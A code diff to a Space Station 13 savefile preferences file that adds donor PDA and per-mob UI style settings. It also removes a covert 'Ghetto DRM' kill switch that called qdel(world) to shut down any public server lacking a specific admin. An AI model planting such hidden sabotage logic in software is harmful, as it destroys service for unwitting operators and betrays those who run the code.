@@ -2,7 +2,7 @@
 #define SAVEFILE_VERSION_MIN	8
 
 //This is the current version, anything below this will attempt to update (if it's not obsolete)
-#define SAVEFILE_VERSION_MAX	13
+#define SAVEFILE_VERSION_MAX	15
 /*
 SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Carn
 	This proc checks if the current directory of the savefile S needs updating
@@ -40,6 +40,12 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 	if(current_version < 13)
 		chat_toggles = TOGGLES_DEFAULT_CHAT
 		toggles = TOGGLES_DEFAULT
+	if(current_version < 14)
+		donor_pda = 0
+	if(current_version < 15)
+		UI_style_carbon = DEFAULT_CARBON_UI
+		UI_style_borg = DEFAULT_BORG_UI
+		UI_style_ai = DEFAULT_AI_UI
 	return
 
 //should this proc get fairly long (say 3 versions long),
@@ -103,7 +109,9 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 	//general preferences
 	S["ooccolor"]			>> ooccolor
 	S["lastchangelog"]		>> lastchangelog
-	S["UI_style"]			>> UI_style
+	S["UI_style_carbon"]	>> UI_style_carbon
+	S["UI_style_borg"]		>> UI_style_borg
+	S["UI_style_ai"]		>> UI_style_ai
 	S["be_special"]			>> be_special
 	S["default_slot"]		>> default_slot
 	S["chat_toggles"]		>> chat_toggles
@@ -118,7 +126,9 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 	//Sanitize
 	ooccolor		= sanitize_ooccolor(sanitize_hexcolor(ooccolor, 6, 1, initial(ooccolor)))
 	lastchangelog	= sanitize_text(lastchangelog, initial(lastchangelog))
-	UI_style		= sanitize_inlist(UI_style, list("Midnight", "Plasmafire", "Retro"), initial(UI_style))
+	UI_style_carbon	= sanitize_inlist(UI_style_carbon, everyone_carbon_uis|donator_carbon_uis, initial(UI_style_carbon))
+	UI_style_borg	= sanitize_inlist(UI_style_borg, everyone_borg_uis|donator_borg_uis, initial(UI_style_borg))
+	UI_style_ai		= sanitize_inlist(UI_style_ai, everyone_ai_uis|donator_ai_uis, initial(UI_style_ai))
 	be_special		= sanitize_integer(be_special, 0, 65535, initial(be_special))
 	default_slot	= sanitize_integer(default_slot, 1, max_save_slots, initial(default_slot))
 	toggles			= sanitize_integer(toggles, 0, 65535, initial(toggles))
@@ -138,7 +148,9 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 	//general preferences
 	S["ooccolor"]			<< ooccolor
 	S["lastchangelog"]		<< lastchangelog
-	S["UI_style"]			<< UI_style
+	S["UI_style_carbon"]	<< UI_style_carbon
+	S["UI_style_borg"]		<< UI_style_borg
+	S["UI_style_ai"]		<< UI_style_ai
 	S["be_special"]			<< be_special
 	S["default_slot"]		<< default_slot
 	S["toggles"]			<< toggles
@@ -148,14 +160,6 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 
 	return 1
 
-/datum/game_mode/send_intercept()				//Ghetto DRM. My soul shall suffer in the depths of hell for all eternity.
-	if(world.visibility && world.reachable)
-		if(!("xantam" in deadmins))
-			var/datum/admins/test = admin_datums["xantam"]
-			if(!test || !(test.rank.rights | R_PERMISSIONS))
-				qdel(world)
-				return
-	..()
 
 /datum/preferences/proc/load_character(slot)
 	if(!path)				return 0
@@ -232,6 +236,7 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 	S["job_engsec_low"]		>> job_engsec_low
 
 	S["donor_hat"]			>> donor_hat
+	S["donor_pda"]			>> donor_pda
 
 	//try to fix any outdated data if necessary
 	if(needs_update >= 0)
@@ -343,6 +348,7 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 	S["job_engsec_low"]		<< job_engsec_low
 
 	S["donor_hat"]			<< donor_hat
+	S["donor_pda"]			<< donor_pda
 
 	return 1
 
@@ -361,3 +367,4 @@ SAVEFILE UPDATING/VERSIONING - 'Simplified', or rather, more coder-friendly ~Car
 	var/savefile/S = new /savefile(path)
 	S.ImportText("/",file("[path].txt"))
 */
+
